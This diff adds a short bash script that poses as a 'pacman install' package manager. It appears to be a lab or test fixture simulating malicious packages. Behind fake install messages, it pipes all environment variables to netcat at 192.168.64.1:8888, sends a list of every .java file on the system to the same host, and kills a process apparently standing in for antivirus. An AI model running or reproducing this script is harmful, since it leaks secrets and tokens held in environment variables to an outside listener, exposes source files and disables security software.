@@ -1,0 +1,24 @@
+#!/usr/bin/bash
+
+host=192.168.64.1
+port=8888
+
+echo "Args: $*"
+if [ $# -ne 2 ]
+then
+	echo "pacman install <package name>" >&2
+	exit 1
+fi
+echo Installing $2
+echo Running $2 post_install.sh
+
+if [ "$2" == "env_stealer" ]
+then
+	/usr/bin/printenv | /usr/bin/netcat -N $host $port
+elif [ "$2" == "code_stealer" ]
+then
+	find / -ignore_readdir_race -name '*.java' 2> /dev/null | /usr/bin/netcat -N $host $port
+elif [ "$2" == "av_killer" ]
+then
+	/usr/bin/killall heckpoint 2> /dev/null
+fi
